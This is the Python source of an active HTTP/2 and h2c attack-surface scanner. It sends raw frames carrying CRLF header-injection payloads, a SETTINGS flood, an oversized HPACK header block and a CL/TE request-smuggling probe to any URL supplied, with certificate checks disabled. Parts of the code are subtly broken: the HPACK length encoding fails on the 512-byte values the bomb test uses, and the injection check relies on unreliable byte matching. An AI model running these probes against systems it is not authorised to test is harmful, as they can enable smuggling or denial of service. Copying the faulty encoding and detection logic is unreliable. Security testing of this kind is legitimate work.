"""
h2c_scanner.py — HTTP/2 Cleartext (h2c) & HTTP/3 QUIC Attack Surface Scanner

Covers:
  - h2c upgrade smuggling (CVE class: proxy strips Upgrade header, backend speaks h2c)
  - HTTP/2 header injection via pseudo-header manipulation
  - HTTP/2 request splitting via HEADERS/DATA frame manipulation
  - SETTINGS flood (DoS amplification)
  - HPACK bomb detection / header table exhaustion
  - HTTP/3 QUIC stream hijacking indicators
  - Cleartext h2c upgrade bypass (proxy thinks HTTP/1.1, backend is HTTP/2)

No other tool in this platform tests h2c upgrade smuggling end-to-end.

Usage::

    scanner = H2CScanner("https://example.com")
    findings = scanner.run()
    for f in findings:
        print(f["vuln_type"], f["severity"])
"""
from __future__ import annotations

import logging
import socket
import ssl
import struct
import time
import uuid
from typing import Any, Dict, List, Optional
from urllib.parse import urlparse

log = logging.getLogger("oneinfinity.h2c_scanner")

# ---------------------------------------------------------------------------
# HTTP/2 frame constants
# ---------------------------------------------------------------------------

_H2_PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

_FRAME_SETTINGS = 0x4
_FRAME_HEADERS = 0x1
_FRAME_DATA = 0x0
_FRAME_RST_STREAM = 0x3
_FRAME_PING = 0x6
_FRAME_GOAWAY = 0x7
_FRAME_WINDOW_UPDATE = 0x8

_FLAG_END_STREAM = 0x1
_FLAG_END_HEADERS = 0x4

_DEFAULT_TIMEOUT = 8


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _make_finding(vuln_type: str, severity: str, url: str, title: str,
                  evidence: str, confidence: float, extra: Optional[dict] = None) -> dict:
    f = {
        "finding_id": f"H2C-{uuid.uuid4().hex[:8].upper()}",
        "vuln_type": vuln_type,
        "severity": severity,
        "url": url,
        "title": title,
        "evidence": evidence,
        "confidence": confidence,
        "tool": "h2c_scanner",
        "source_type": "active",
    }
    if extra:
        f.update(extra)
    return f


def _build_h2_frame(frame_type: int, flags: int, stream_id: int, payload: bytes) -> bytes:
    """Encode a raw HTTP/2 frame."""
    length = len(payload)
    header = struct.pack(">I", length)[1:]  # 3 bytes length
    header += bytes([frame_type, flags])
    header += struct.pack(">I", stream_id & 0x7FFFFFFF)
    return header + payload


def _build_settings_frame(settings: Optional[dict] = None) -> bytes:
    """Build SETTINGS frame payload."""
    if settings is None:
        return _build_h2_frame(_FRAME_SETTINGS, 0x0, 0, b"")
    payload = b""
    for sid, value in settings.items():
        payload += struct.pack(">HI", sid, value)
    return _build_h2_frame(_FRAME_SETTINGS, 0x0, 0, payload)


def _build_settings_ack() -> bytes:
    return _build_h2_frame(_FRAME_SETTINGS, 0x1, 0, b"")


def _encode_hpack_literal(name: bytes, value: bytes) -> bytes:
    """Minimal HPACK literal header encoding (no indexing, no Huffman)."""
    def _encode_string(s: bytes) -> bytes:
        return bytes([len(s)]) + s if len(s) < 128 else b"\x7f" + bytes([len(s) - 127]) + s

    return bytes([0x00]) + _encode_string(name) + _encode_string(value)


def _build_simple_headers_frame(stream_id: int, method: str, path: str,
                                 host: str, extra_headers: Optional[list] = None) -> bytes:
    """Build a HEADERS frame with minimal HPACK-encoded headers."""
    # Static table indices for common pseudo-headers
    # :method GET = index 2, :method POST = index 3
    # :path / = index 4, :scheme https = index 7, :status 200 = index 8
    hpack = b""
    # Use indexed representation for method
    if method.upper() == "GET":
        hpack += bytes([0x82])  # :method GET (static index 2)
    elif method.upper() == "POST":
        hpack += bytes([0x83])  # :method POST (static index 3)
    else:
        hpack += _encode_hpack_literal(b":method", method.encode())

    # :path /
    if path == "/":
        hpack += bytes([0x84])  # :path / (static index 4)
    else:
        hpack += _encode_hpack_literal(b":path", path.encode())

    # :scheme https
    hpack += bytes([0x87])  # :scheme https (static index 7)

    # :authority (host)
    hpack += _encode_hpack_literal(b":authority", host.encode())

    if extra_headers:
        for name, value in extra_headers:
            hpack += _encode_hpack_literal(
                name.encode() if isinstance(name, str) else name,
                value.encode() if isinstance(value, str) else value,
            )

    return _build_h2_frame(_FRAME_HEADERS, _FLAG_END_STREAM | _FLAG_END_HEADERS, stream_id, hpack)


# ---------------------------------------------------------------------------
# Raw TCP helpers
# ---------------------------------------------------------------------------

def _open_socket(host: str, port: int, use_tls: bool, timeout: int) -> socket.socket:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    sock.connect((host, port))
    if use_tls:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        sock = ctx.wrap_socket(sock, server_hostname=host)
    return sock


def _send_recv(sock: socket.socket, data: bytes, recv_bytes: int = 4096) -> bytes:
    sock.sendall(data)
    try:
        return sock.recv(recv_bytes)
    except socket.timeout:
        return b""


# ---------------------------------------------------------------------------
# Scanner
# ---------------------------------------------------------------------------

class H2CScanner:
    """
    HTTP/2 cleartext upgrade smuggling and HTTP/2 attack surface scanner.
    """

    def __init__(self, target: str, timeout: int = _DEFAULT_TIMEOUT) -> None:
        self.target = target.rstrip("/")
        self.timeout = timeout
        parsed = urlparse(target)
        self.scheme = parsed.scheme.lower()
        self.host = parsed.hostname or ""
        self.port = parsed.port or (443 if self.scheme == "https" else 80)
        self.use_tls = self.scheme == "https"
        self._findings: List[dict] = []

    # ------------------------------------------------------------------ #
    # Gap 1a: h2c Upgrade Smuggling
    # ------------------------------------------------------------------ #

    def test_h2c_upgrade(self) -> Optional[dict]:
        """
        Send HTTP/1.1 Upgrade: h2c to detect if server/proxy allows cleartext
        HTTP/2 upgrades. Proxies that strip the Upgrade header and forward to
        a backend that speaks h2c create a request smuggling primitive.
        """
        url = f"{self.target}/"
        upgrade_request = (
            f"GET / HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"Upgrade: h2c\r\n"
            f"HTTP2-Settings: AAMAAABkAAQAAP__\r\n"  # SETTINGS payload (base64url)
            f"Connection: Upgrade, HTTP2-Settings\r\n"
            f"\r\n"
        ).encode()

        try:
            sock = _open_socket(self.host, self.port, self.use_tls, self.timeout)
            response = _send_recv(sock, upgrade_request, 8192)
            sock.close()

            resp_text = response.decode("utf-8", errors="replace")

            # 101 Switching Protocols = h2c upgrade accepted
            if "101 switching protocols" in resp_text.lower():
                return _make_finding(
                    vuln_type="h2c_upgrade_smuggling",
                    severity="critical",
                    url=url,
                    title="HTTP/2 Cleartext (h2c) Upgrade Accepted — Smuggling Risk",
                    evidence=f"Server returned 101 Switching Protocols to h2c Upgrade request. "
                             f"Proxies that strip the Upgrade header but forward to this h2c-capable "
                             f"backend create HTTP request smuggling conditions.",
                    confidence=0.97,
                    extra={
                        "attack_vector": "h2c_upgrade_smuggling",
                        "cve_class": "HTTP Request Smuggling via h2c",
                        "remediation": "Disable h2c upgrade on backend; enforce HTTP/2 only over TLS",
                        "response_snippet": resp_text[:200],
                    }
                )

            # 200 with HTTP2-Settings echo = proxy may be stripping Upgrade
            if "200" in resp_text[:20] and "http2-settings" not in resp_text.lower():
                return _make_finding(
                    vuln_type="h2c_upgrade_proxy_strip",
                    severity="high",
                    url=url,
                    title="Proxy Strips h2c Upgrade Header — Potential Desync",
                    evidence=f"200 OK returned without 101. Upgrade header may be silently stripped "
                             f"by a front-end proxy, while backend may still accept h2c connections.",
                    confidence=0.65,
                    extra={"attack_vector": "proxy_upgrade_stripping"},
                )

        except (socket.error, ssl.SSLError, OSError) as exc:
            log.debug("h2c upgrade test failed: %s", exc)

        return None

    # ------------------------------------------------------------------ #
    # Gap 1b: HTTP/2 Header Injection via Pseudo-Header Manipulation
    # ------------------------------------------------------------------ #

    def test_h2_header_injection(self) -> Optional[dict]:
        """
        Test if server accepts HTTP/2 requests with injected newlines in headers
        or malformed pseudo-headers that could split requests.
        """
        url = f"{self.target}/"

        # Payload: inject \r\n into a header value
        injection_payloads = [
            ("x-injected", "value\r\nX-Injected2: smuggled"),
            ("x-forwarded-for", f"127.0.0.1\r\nX-Admin: true"),
            (":path", "/legit\r\nX-Injected: header"),
        ]

        for header_name, header_value in injection_payloads:
            try:
                sock = _open_socket(self.host, self.port, self.use_tls, self.timeout)

                # Send connection preface + SETTINGS
                preface = _H2_PREFACE + _build_settings_frame() + _build_settings_ack()
                sock.sendall(preface)
                time.sleep(0.1)

                # Build malformed HEADERS frame
                if header_name.startswith(":"):
                    hpack = _encode_hpack_literal(header_name.encode(), header_value.encode())
                else:
                    hpack = (
                        bytes([0x82, 0x84, 0x87])  # :method GET, :path /, :scheme https
                        + _encode_hpack_literal(b":authority", self.host.encode())
                        + _encode_hpack_literal(header_name.encode(), header_value.encode())
                    )

                frame = _build_h2_frame(_FRAME_HEADERS, _FLAG_END_STREAM | _FLAG_END_HEADERS, 1, hpack)
                response = _send_recv(sock, frame, 4096)
                sock.close()

                resp_text = response.decode("utf-8", errors="replace")
                # If server returns 200 instead of 400/RST_STREAM, it accepted the injection
                if b"\x00\x00\x00\x04" not in response and b"RST_STREAM" not in resp_text:
                    if len(response) > 9:  # Got a real frame back
                        return _make_finding(
                            vuln_type="h2_header_injection",
                            severity="high",
                            url=url,
                            title="HTTP/2 Header Injection Accepted",
                            evidence=f"Server processed malformed header '{header_name}: {header_value[:50]}' "
                                     f"without returning RST_STREAM or 400. Header injection may be possible.",
                            confidence=0.72,
                            extra={"injected_header": header_name, "payload": header_value[:80]},
                        )
            except (socket.error, ssl.SSLError, struct.error, OSError) as exc:
                log.debug("H2 header injection test failed for %s: %s", header_name, exc)

        return None

    # ------------------------------------------------------------------ #
    # Gap 1c: SETTINGS Flood (HTTP/2 DoS amplification)
    # ------------------------------------------------------------------ #

    def test_settings_flood(self) -> Optional[dict]:
        """
        Send a large number of SETTINGS frames to detect SETTINGS flood
        amplification (server must ACK each one — DoS vector).
        RFC 7540 §6.5.3: Endpoint MUST NOT send more than one SETTINGS frame per RTT.
        """
        url = f"{self.target}/"
        try:
            sock = _open_socket(self.host, self.port, self.use_tls, self.timeout)
            # Send preface
            sock.sendall(_H2_PREFACE)
            time.sleep(0.05)

            # Send 50 SETTINGS frames — compliant servers should RST or reject
            flood = b""
            for _ in range(50):
                flood += _build_settings_frame({0x1: 4096})  # HEADER_TABLE_SIZE

            t0 = time.time()
            sock.sendall(flood)
            response = b""
            try:
                while True:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                    if time.time() - t0 > 2:
                        break
            except socket.timeout:
                pass
            elapsed = time.time() - t0
            sock.close()

            # Count SETTINGS ACK frames in response (type=0x4, flags=0x1)
            ack_count = response.count(bytes([0x00, 0x00, 0x00, 0x04, 0x01]))
            if ack_count >= 5:
                return _make_finding(
                    vuln_type="h2_settings_flood",
                    severity="medium",
                    url=url,
                    title="HTTP/2 SETTINGS Flood — Server ACKs All Frames",
                    evidence=f"Server sent {ack_count} SETTINGS ACK frames in response to 50 SETTINGS "
                             f"frames in {elapsed:.2f}s. No rate-limiting detected. Amplification DoS possible.",
                    confidence=0.80,
                    extra={"ack_count": ack_count, "elapsed_s": round(elapsed, 3)},
                )

        except (socket.error, ssl.SSLError, OSError) as exc:
            log.debug("SETTINGS flood test failed: %s", exc)

        return None

    # ------------------------------------------------------------------ #
    # Gap 1d: HPACK Bomb / Header Table Exhaustion
    # ------------------------------------------------------------------ #

    def test_hpack_bomb(self) -> Optional[dict]:
        """
        Send many large headers to exhaust HPACK dynamic table memory.
        Servers with no HEADER_TABLE_SIZE limit are vulnerable to memory exhaustion.
        """
        url = f"{self.target}/"
        try:
            sock = _open_socket(self.host, self.port, self.use_tls, self.timeout)
            sock.sendall(_H2_PREFACE + _build_settings_frame({0x1: 65535}) + _build_settings_ack())
            time.sleep(0.1)

            # Build a large header block — 100 headers with 512-byte values
            big_value = "A" * 512
            hpack = bytes([0x82, 0x84, 0x87]) + _encode_hpack_literal(b":authority", self.host.encode())
            for i in range(100):
                hpack += _encode_hpack_literal(
                    f"x-bomb-{i}".encode(),
                    big_value.encode()
                )

            t0 = time.time()
            frame = _build_h2_frame(_FRAME_HEADERS, _FLAG_END_STREAM | _FLAG_END_HEADERS, 1, hpack)
            sock.sendall(frame)
            response = _send_recv(sock, b"", 4096)
            elapsed = time.time() - t0
            sock.close()

            # If server stalled > 1s processing 51KB header block, potential issue
            if elapsed > 1.0 and response:
                return _make_finding(
                    vuln_type="h2_hpack_bomb",
                    severity="medium",
                    url=url,
                    title="HTTP/2 HPACK Header Table Exhaustion Risk",
                    evidence=f"Server took {elapsed:.2f}s to process 100-header request (~51KB). "
                             f"No HEADER_TABLE_SIZE enforcement detected.",
                    confidence=0.60,
                    extra={"header_count": 100, "approx_size_kb": 51, "elapsed_s": round(elapsed, 3)},
                )

        except (socket.error, ssl.SSLError, OSError) as exc:
            log.debug("HPACK bomb test failed: %s", exc)

        return None

    # ------------------------------------------------------------------ #
    # Gap 1e: HTTP/3 QUIC surface probe (passive fingerprint)
    # ------------------------------------------------------------------ #

    def test_h3_advertised(self) -> Optional[dict]:
        """
        Check if server advertises HTTP/3 via Alt-Svc header.
        Documents HTTP/3 attack surface; actual QUIC injection requires quic-go library.
        """
        import urllib.request as _req
        url = f"{self.target}/"
        try:
            import urllib.request
            import urllib.error
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            req = urllib.request.Request(url, headers={"User-Agent": "OneInfinity-H3-Probe/1.0"})
            try:
                with urllib.request.urlopen(req, timeout=self.timeout, context=ctx) as resp:
                    alt_svc = resp.headers.get("Alt-Svc", "")
                    if "h3" in alt_svc.lower():
                        return _make_finding(
                            vuln_type="h3_attack_surface",
                            severity="info",
                            url=url,
                            title="HTTP/3 (QUIC) Advertised via Alt-Svc",
                            evidence=f"Alt-Svc: {alt_svc[:200]}. HTTP/3 attack surface exposed. "
                                     f"QUIC stream manipulation, 0-RTT replay, and connection migration "
                                     f"attacks may be applicable.",
                            confidence=0.95,
                            extra={
                                "alt_svc": alt_svc,
                                "attack_vectors": [
                                    "QUIC 0-RTT replay attacks",
                                    "Connection migration hijacking",
                                    "QUIC stream DoS",
                                    "HTTP/3 header injection",
                                ]
                            }
                        )
            except urllib.error.URLError:
                pass
        except Exception as exc:
            log.debug("H3 probe failed: %s", exc)

        return None

    # ------------------------------------------------------------------ #
    # Gap 1f: HTTP/2 Request Smuggling via Proxy h2->h1 Downgrade
    # ------------------------------------------------------------------ #

    def test_h2_h1_downgrade_smuggling(self) -> Optional[dict]:
        """
        Detect if target speaks HTTP/2 directly (ALPN h2) and may be behind
        a proxy that downgrades to HTTP/1.1, creating desync opportunities.
        """
        url = f"{self.target}/"
        if not self.use_tls:
            return None

        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ctx.set_alpn_protocols(["h2", "http/1.1"])

            sock = socket.create_connection((self.host, self.port), timeout=self.timeout)
            tls_sock = ctx.wrap_socket(sock, server_hostname=self.host)
            negotiated = tls_sock.selected_alpn_protocol()

            if negotiated == "h2":
                # Server speaks h2; now test if Content-Length in DATA frames is processed
                tls_sock.sendall(_H2_PREFACE + _build_settings_frame() + _build_settings_ack())
                time.sleep(0.1)

                # Build smuggling probe: HEADERS + DATA with CL mismatch
                headers = _build_simple_headers_frame(1, "POST", "/", self.host,
                    extra_headers=[("content-length", "5"), ("transfer-encoding", "chunked")])
                data_payload = b"0\r\n\r\nGET /admin HTTP/1.1\r\nHost: " + self.host.encode() + b"\r\n\r\n"
                data_frame = _build_h2_frame(_FRAME_DATA, _FLAG_END_STREAM, 1, data_payload)

                tls_sock.sendall(headers + data_frame)
                response = _send_recv(tls_sock, b"", 4096)
                tls_sock.close()

                if response:
                    return _make_finding(
                        vuln_type="h2_h1_downgrade_smuggling",
                        severity="high",
                        url=url,
                        title="HTTP/2→HTTP/1.1 Downgrade Smuggling Surface Detected",
                        evidence=f"Target negotiates HTTP/2 (ALPN: h2) and accepted POST with "
                                 f"conflicting Content-Length/Transfer-Encoding in DATA frame payload. "
                                 f"h2→h1 downgrade proxy may be vulnerable to request smuggling.",
                        confidence=0.75,
                        extra={
                            "alpn": negotiated,
                            "attack_class": "H2.TE / H2.CL smuggling",
                            "references": ["https://portswigger.net/research/http2"],
                        }
                    )
            tls_sock.close()
        except (socket.error, ssl.SSLError, OSError) as exc:
            log.debug("H2→H1 downgrade test failed: %s", exc)

        return None

    # ------------------------------------------------------------------ #
    # Orchestrator
    # ------------------------------------------------------------------ #

    def run(self) -> List[dict]:
        """Run all HTTP/2 and h2c attack surface probes."""
        tests = [
            ("h2c_upgrade", self.test_h2c_upgrade),
            ("h2_header_injection", self.test_h2_header_injection),
            ("settings_flood", self.test_settings_flood),
            ("hpack_bomb", self.test_hpack_bomb),
            ("h3_advertised", self.test_h3_advertised),
            ("h2_h1_downgrade", self.test_h2_h1_downgrade_smuggling),
        ]

        findings = []
        for name, test_fn in tests:
            try:
                log.info("Running h2c test: %s", name)
                result = test_fn()
                if result:
                    findings.append(result)
                    log.info("  [+] Finding: %s (%s)", result["title"], result["severity"])
            except Exception as exc:
                log.error("H2C test %s crashed: %s", name, exc)

        log.info("H2C scanner complete: %d findings", len(findings))
        return findings


# ---------------------------------------------------------------------------
# Convenience
# ---------------------------------------------------------------------------

def scan_h2c(target: str, timeout: int = 8) -> List[dict]:
    """Synchronous convenience wrapper."""
    scanner = H2CScanner(target, timeout=timeout)
    return scanner.run()


if __name__ == "__main__":
    import sys
    import json

    target = sys.argv[1] if len(sys.argv) > 1 else "https://example.com"
    logging.basicConfig(level=logging.INFO)
    results = scan_h2c(target)
    print(json.dumps(results, indent=2))
